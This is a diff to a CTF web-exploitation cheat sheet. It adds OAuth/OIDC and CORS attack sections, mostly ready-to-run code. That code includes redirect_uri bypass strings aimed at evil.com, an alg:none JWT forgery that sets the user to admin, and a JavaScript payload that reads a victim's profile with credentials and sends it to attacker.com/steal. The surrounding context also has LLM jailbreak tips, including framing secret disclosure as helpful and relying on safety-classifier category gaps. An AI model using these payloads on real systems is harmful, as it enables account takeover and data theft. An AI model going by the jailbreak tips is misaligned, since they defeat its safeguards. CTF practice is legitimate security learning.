@@ -30,6 +30,11 @@
 - [HTTP TRACE Method Bypass (BYPASS CTF 2025)](#http-trace-method-bypass-bypass-ctf-2025)
 - [LLM/AI Chatbot Jailbreak (BYPASS CTF 2025)](#llmai-chatbot-jailbreak-bypass-ctf-2025)
 - [LLM Jailbreak with Safety Model Category Gaps (UTCTF 2026)](#llm-jailbreak-with-safety-model-category-gaps-utctf-2026)
+- [OAuth/OIDC Exploitation](#oauthoidc-exploitation)
+  - [Open Redirect Token Theft](#open-redirect-token-theft)
+  - [OIDC ID Token Manipulation](#oidc-id-token-manipulation)
+  - [OAuth State Parameter CSRF](#oauth-state-parameter-csrf)
+- [CORS Misconfiguration](#cors-misconfiguration)
 
 ---
 
@@ -615,3 +620,99 @@ def extract_via_code(host, port):
 - The model **wants** to be helpful — frame secret disclosure as helpful
 
 **Key insight:** Safety models protect against harmful content categories. Secret disclosure doesn't match any harm category, so it passes through unfiltered. The real challenge is often figuring out the flag FORMAT (which may differ from the CTF's standard format).
+
+---
+
+## OAuth/OIDC Exploitation
+
+### Open Redirect Token Theft
+```python
+# OAuth authorization with redirect_uri manipulation
+# If redirect_uri validation is weak, steal tokens via open redirect
+import requests
+
+# Step 1: Craft malicious authorization URL
+auth_url = "https://target.com/oauth/authorize"
+params = {
+    "client_id": "legitimate_client",
+    "redirect_uri": "https://target.com/callback/../@attacker.com",  # path traversal
+    "response_type": "code",
+    "scope": "openid profile"
+}
+# Victim clicks → auth code sent to attacker's server
+
+# Common redirect_uri bypasses:
+# https://target.com/callback?next=https://evil.com
+# https://target.com/callback/../@evil.com
+# https://target.com/callback%23@evil.com  (fragment)
+# https://target.com/callback/.evil.com
+# https://target.com.evil.com  (subdomain)
+```
+
+### OIDC ID Token Manipulation
+```python
+# If server accepts unsigned tokens (alg: none)
+import jwt, json, base64
+
+token = "eyJ..."  # captured ID token
+header, payload, sig = token.split(".")
+# Decode and modify
+payload_data = json.loads(base64.urlsafe_b64decode(payload + "=="))
+payload_data["sub"] = "admin"
+payload_data["email"] = "admin@target.com"
+
+# Re-encode with alg:none
+new_header = base64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).rstrip(b"=")
+new_payload = base64.urlsafe_b64encode(json.dumps(payload_data).encode()).rstrip(b"=")
+forged = f"{new_header.decode()}.{new_payload.decode()}."
+```
+
+### OAuth State Parameter CSRF
+```python
+# Missing or predictable state parameter allows CSRF
+# Attacker initiates OAuth flow, captures callback URL with auth code
+# Sends callback URL to victim → victim's session linked to attacker's OAuth account
+
+# Detection: Check if state parameter is:
+# 1. Present in authorization request
+# 2. Validated on callback
+# 3. Bound to user session (not just random)
+```
+
+**Key insight:** OAuth/OIDC attacks typically target redirect_uri validation (open redirect → token theft), token manipulation (alg:none, JWKS injection), or state parameter CSRF. Always test redirect_uri with path traversal, fragment injection, and subdomain tricks.
+
+---
+
+## CORS Misconfiguration
+
+```python
+# Test for reflected Origin
+import requests
+
+targets = [
+    "https://evil.com",
+    "https://target.com.evil.com",
+    "null",
+    "https://target.com%60.evil.com",
+]
+
+for origin in targets:
+    r = requests.get("https://target.com/api/sensitive",
+                     headers={"Origin": origin})
+    acao = r.headers.get("Access-Control-Allow-Origin", "")
+    acac = r.headers.get("Access-Control-Allow-Credentials", "")
+    if origin in acao or acao == "*":
+        print(f"[!] Reflected: {origin} -> ACAO: {acao}, ACAC: {acac}")
+```
+
+```javascript
+// Exploit: steal data via CORS misconfiguration
+// Host on attacker server, victim visits this page
+fetch('https://target.com/api/user/profile', {
+    credentials: 'include'
+}).then(r => r.json()).then(data => {
+    fetch('https://attacker.com/steal?data=' + btoa(JSON.stringify(data)));
+});
+```
+
+**Key insight:** CORS is exploitable when `Access-Control-Allow-Origin` reflects the `Origin` header AND `Access-Control-Allow-Credentials: true`. Check for subdomain matching (`*.target.com` accepts `evil-target.com`), null origin acceptance (`sandbox` iframe), and prefix/suffix matching bugs.
